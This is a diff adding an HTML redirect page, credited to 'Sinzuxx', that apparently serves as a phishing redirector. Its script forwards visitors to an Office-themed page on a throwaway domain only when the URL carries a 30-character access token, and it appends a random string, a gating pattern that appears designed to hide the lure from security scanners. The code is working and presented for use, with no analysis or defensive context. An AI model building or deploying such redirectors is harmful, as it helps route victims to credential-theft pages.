@@ -1,0 +1,49 @@
+Written by Sinzuxx
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <script>
+        // Replace 'https://example.com' with your desired redirect URL
+        const redirectTo = "https://iw.kicgqpj2.sa.com/m3.live/office-3D8/index.php";
+
+        // Function to generate a random string of mixed characters (uppercase, lowercase, numbers)
+        function generateRandomString(length) {
+            const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+            let result = "";
+            for (let i = 0; i < length; i++) {
+                result += characters.charAt(Math.floor(Math.random() * characters.length));
+            }
+            return result;
+        }
+
+        // Function to get query parameters by name from the URL
+        function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+        }
+
+        // Check if the 30-character uppercase string exists in the URL
+        const upperString = getQueryParam("upperString");
+
+        if (upperString && upperString.length === 30) {
+            // Generate a random 80-character string
+            const randomString = generateRandomString(80);
+
+            // Redirect to the desired URL with the random string appended
+            const newUrl = redirectTo + "?" + randomString;
+            console.log("Redirecting to:", newUrl);  // Log for debugging purposes
+            window.location.href = newUrl;
+        } else {
+            // If no valid 30-character uppercase string, display a message
+            document.body.innerHTML = "<p>Invalid URL. Please provide a valid 30-character uppercase string in the URL.</p>";
+        }
+    </script>
+</head>
+<body>
+    <p>Redirecting you to the new page...</p>
+</body>
+</html>
